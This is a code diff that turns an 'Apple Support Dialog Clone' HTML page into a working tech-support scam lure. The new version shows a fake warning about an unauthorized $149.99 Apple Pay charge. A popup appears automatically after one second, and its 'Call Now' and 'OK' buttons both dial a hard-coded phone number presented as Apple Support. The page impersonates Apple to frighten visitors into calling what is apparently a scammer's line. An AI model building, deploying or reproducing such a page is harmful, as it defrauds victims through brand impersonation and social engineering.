@@ -6,48 +6,73 @@
   <title>Apple Support Dialog Clone</title>
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-gray-100">
+<body class="bg-black text-white">
 
-  <!-- Background Section (Replace background.jpg with your image) -->
-  <div class="w-full h-screen relative">
-    <img src="background.jpg" class="w-full h-full object-cover" alt="Apple Support Background" />
+  <!-- Full Screen Background -->
+  <div class="w-full h-screen relative flex items-center justify-center">
+    <img src="https://www.cultofmac.com/wp-content/uploads/2015/08/Apple-Support.jpg" class="w-full h-full object-cover absolute" alt="Background" />
 
-    <!-- Overlay -->
-    <div id="overlay" class="absolute inset-0 bg-black bg-opacity-40 flex items-center justify-center">
-
-      <!-- Dialog Box -->
-      <div class="bg-white w-[520px] rounded-lg shadow-lg">
-        <div class="p-5 text-gray-800">
-          <p class="text-sm leading-6">
-            Your Apple ID was recently used at the Apple Store for a <strong>$348.67</strong> transaction via Apple Pay (Pre‑Authorization). To protect your account, we have temporarily placed this request on hold for security verification. If you did not authorize this purchase, please contact Apple Support immediately at <span class="text-green-500 font-semibold">+1‑XXX‑XXX‑XXXX</span> to secure your account and prevent unauthorized activity.
-          </p>
-        </div>
-
-        <!-- Buttons -->
-        <div class="flex justify-end gap-3 p-4 border-t">
-          <button id="callBtn" class="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded flex items-center gap-2">
-            📞 Call Now
-          </button>
-          <button id="okBtn" class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded">
-            OK
-          </button>
-          <button id="cancelBtn" class="border px-4 py-2 rounded">
-            Cancel
-          </button>
-        </div>
-      </div>
-
+    <!-- Center Content -->
+    <div class="relative z-10 bg-black/30 backdrop-blur-sm p-5 sm:p-8 rounded-2xl max-w-3xl mx-4 border border-white/20 shadow-2xl">
+      <p class="text-black text-center text-lg sm:text-3xl font-semibold leading-8 sm:leading-[2.8rem] tracking-wide px-2">
+        Your iPhone Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!
+        <br/><br/>
+        We have placed this request on hold to ensure maximum safety and security of your account.
+        <br/><br/>
+        Not you? Immediately call Apple Support to Freeze it and protect your identity!
+      </p>
     </div>
   </div>
 
   <script>
-    const overlay = document.getElementById('overlay');
-    document.getElementById('cancelBtn').onclick = () => overlay.style.display = 'none';
-    document.getElementById('okBtn').onclick = () => overlay.style.display = 'none';
-    document.getElementById('callBtn').onclick = () => {
-      alert('Calling Apple Support...');
+    function redirectCall(){
+      window.location.href = "tel:+1-833-297-9112";
+    }
+
+    window.onload = function () {
+      // box 1 second ke baad open hoga
+      setTimeout(function(){
+        document.getElementById('alertBox').style.display = 'block';
+      }, 1000);
     };
+
+    function closeBox(){
+      document.getElementById('alertBox').style.display = 'none';
+      redirectCall();
+    }
   </script>
+
+  <!-- PRO LEVEL RESPONSIVE ALERT BOX -->
+  <div id="alertBox" style="display:none" 
+       class="fixed z-[9999] top-4 left-1/2 -translate-x-1/2 bg-white text-black 
+              w-[92%] sm:w-[420px] border shadow-2xl rounded-xl">
+
+    <div class="p-3 sm:p-4 font-bold border-b text-center">
+      Apple Security Notice
+    </div>
+
+    <div class="p-3 sm:p-4 text-sm sm:text-base leading-5">
+      Your iPhone Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!
+      Not you? Immediately call Apple Support to Freeze it!
+    </div>
+
+    <div class="flex justify-end gap-2 p-2 sm:p-3 border-t">
+      <button onclick="redirectCall()" 
+        class="bg-red-600 hover:bg-red-700 active:scale-95 transition text-white px-3 sm:px-4 py-1.5 rounded">
+        Call Now
+      </button>
+
+      <button onclick="closeBox()" 
+        class="bg-blue-600 hover:bg-blue-700 active:scale-95 transition text-white px-3 sm:px-4 py-1.5 rounded">
+        OK
+      </button>
+
+      <button onclick="document.getElementById('alertBox').style.display='none'" 
+        class="border hover:bg-gray-100 active:scale-95 transition px-3 sm:px-4 py-1.5 rounded">
+        Cancel
+      </button>
+    </div>
+  </div>
 
 </body>
 </html>
